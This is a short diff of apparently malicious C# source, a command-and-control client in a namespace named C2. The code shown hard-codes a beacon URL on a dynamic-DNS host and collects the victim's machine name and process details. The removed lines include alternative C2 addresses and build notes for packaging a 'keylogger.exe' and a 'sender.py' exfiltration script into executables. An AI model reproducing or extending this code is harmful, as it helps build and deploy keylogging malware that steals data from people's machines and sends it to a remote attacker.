@@ -7,10 +7,7 @@ namespace C2
     class Program
     {
         private static string requestResult = string.Empty;
-        //private static Uri url = new Uri("https://malwinator.chickenkiller.com");
         private static Uri url = new Uri("http://malwinator.chickenkiller.com");
-        //private static Uri url = new Uri("http://localhost:5000");
-        //private static Uri url = new Uri("http://10.11.97.215:5000");
         private static string machineName = Environment.MachineName; 
         private static Process process = new Process();
         private static string processName = string.Empty;
@@ -461,9 +458,3 @@ namespace C2
         }
     }
 }
-
-// useful commands
-// dotnet publish -c Release
-// executable path: bin\Release\net8.0\win-x64\publish\
-// C:\Users\vlads\Downloads\keylogger.exe
-// C:\Users\vlads\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\LocalCache\local-packages\Python312\Scripts\pyinstaller.exe --onefile .\sender.py
